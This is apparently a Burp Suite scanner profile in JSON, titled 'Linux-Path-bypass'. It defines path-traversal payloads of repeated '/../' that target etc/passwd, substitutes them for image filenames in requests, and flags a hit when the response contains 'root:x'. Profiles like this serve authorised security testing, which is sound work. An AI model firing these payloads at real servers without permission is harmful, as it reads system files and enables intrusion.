[
  {
    "ProfileName": "Linux-Path-bypass",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@Sy3Omda",
    "Payloads": [
      "true,/../{FILE}",
      "true,/../../{FILE}",
      "true,/../../../{FILE}",
      "true,/../../../../{FILE}",
      "true,/../../../../../{FILE}",
      "true,/../../../../../../{FILE}",
      "true,/../../../../../../../{FILE}",
      "true,/../../../../../../../../{FILE}"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,,root:x"
    ],
    "Tags": [
      "PathTraversal",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "Linux-path-bypass",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "Path traversal with payloads: \u003cbr\u003e \u003cpayload\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [
      {
        "type": "Payload",
        "match": "{FILE}",
        "replace": "etc/passwd",
        "regex": "String"
      },
      {
        "type": "Request",
        "match": "([a-zA-Z0-9\\s_\\\\.\\-\\(\\):])+(.png|.jpg|.gif|.bmp|.jpeg|.PNG|.JPG|.GIF|.BMP|.JPEG)",
        "replace": "{PAYLOAD}",
        "regex": "Regex"
      }
    ],
    "VariationAttributes": [],
    "InsertionPointType": [
      34
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]